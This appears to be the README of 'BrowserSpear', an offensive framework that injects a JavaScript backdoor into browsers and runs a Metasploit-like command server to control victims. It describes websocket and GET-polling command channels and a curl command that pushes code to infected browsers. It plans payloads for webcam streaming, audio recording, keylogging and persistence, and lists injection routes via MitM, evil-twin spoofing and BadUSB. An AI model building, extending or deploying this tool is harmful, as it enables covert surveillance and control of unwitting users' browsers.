# BrowserSpear
A framework for exploiting browsers by injecting Javascript to a web-based backdoor

# Aim of the project
- After a backdoor is injected in the browser (spear.html) the backdoor will try a websocket first and otherwise poll with GET requests. If a GET request succeeds but no websocket is possible (browser incompatible, proxy, filter, ... ) it will communicate in both ways with respectivly GET and reponse-headers.
- When a connection is available to a host it can be send Javascript-code to be executed on the machine
- Clients will be identified from the server with a couple commands and a database will be kept in a plain file
- The interface will be combined with the server (nodejs for async events). If the server is already running, make a connection to the existing server through HTTP requests or a websocket to have the same level of access
- Commands will only be accepted if comming from localhost
- The interface is a metasploit-like commnand-based system to list victims and send commands (custom or prepared payloads)
- Examples of payloads: webcam stream, audio record, keylogger, persistance, ... (check BeEF for inspiration)
- SSL protected connection with loadable cert (Future)

# Dependencies
- Nodejs (install with package-manager)
<pre>apt-get install nodejs</pre>
- Websockets (nodejs-library: https://www.npmjs.com/package/websocket) easiest installed with npm (see below)
- Prompt (nodejs-library: https://www.npmjs.com/package/prompt) easiest installed with npm (see below)
- Commander (nodejs-library: https://www.npmjs.com/package/commander) easiest installed with npm (see below)
<pre>apt-get install npm && npm install websockets prompt uglify-js commander</pre> 

# Usage
- To start the command server, use the following command:
<pre>node backend_server.js</pre>

- To test, inject the backdoor as a MitM, serve the file yourself or open http://IP-or-URL-server>:1337/ in a browser

- Commands can be send by typing them in the backend_server.js-interface or doing a HTTP-call:
<pre>curl 'http://localhost:1337/exec?alert("muahahahaha")'</pre>

# TODO & Roadmap
- if necessairy ask to clean port (if something is running on it, maybe pinpoint it) (maybe make bash script starter that checks this?)
- settings and options passed to modules and saved in a way for handler
- (DONE) For testing, if the servers root is requested, return the spear.html file
- (DONE) backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
- interface should take a file to execute (list of commands), 2nd also for when a client connects, also a command on interface to to the same'
- catch tab for completion
- (DONE) a new connection should be fingerprinted 
- ... and merged with the connection object and also logged to a local file with a history of commands.
- Module system with javascript-scripts in files that are parsed into onliners (maybe minified) and then send. Only knowledge is for returning data with socket.send() and developing a way to also have modules for server-side (retrieval of loot) (Idea: support "file"-tag and "stream-tag" and "data"-tag)
- input should be able to be corrected and navigated by the arrow keys without creating escape characters (https://scotch.io/tutorials/build-an-interactive-command-line-application-with-nodejs)
- interface with more layers to list and send commands specific to victim
- GET call to server (from local) to generate payload (newest version) with specified URL to be directed to
- Help command in interface should explain how iframe can be use for the injection of spear.html by tool like bettercap (for example)
- look for persistance options in same manner as poisontab, Also try migration to other tabs
- Penetration to system-level attacks
- History of commands (up and down arrow key) -> prompt library
- Guide with modules, builtup and options for loot retrieval
- modules (attacks) moest be able to run async in sessions (also multiple clients)
- handler option in modules?
- fingerprint maybe module,too heavy,  just only a number?
- Autoreconnect by spear.html

# Examples how to inject
TODO
- bettercap, badusb, mitm by spoofing evil twin (link articles)

# Credits
- Samy Kamkar for the inspiration through the Poisontab project and the code that provides the low-level base of the project.
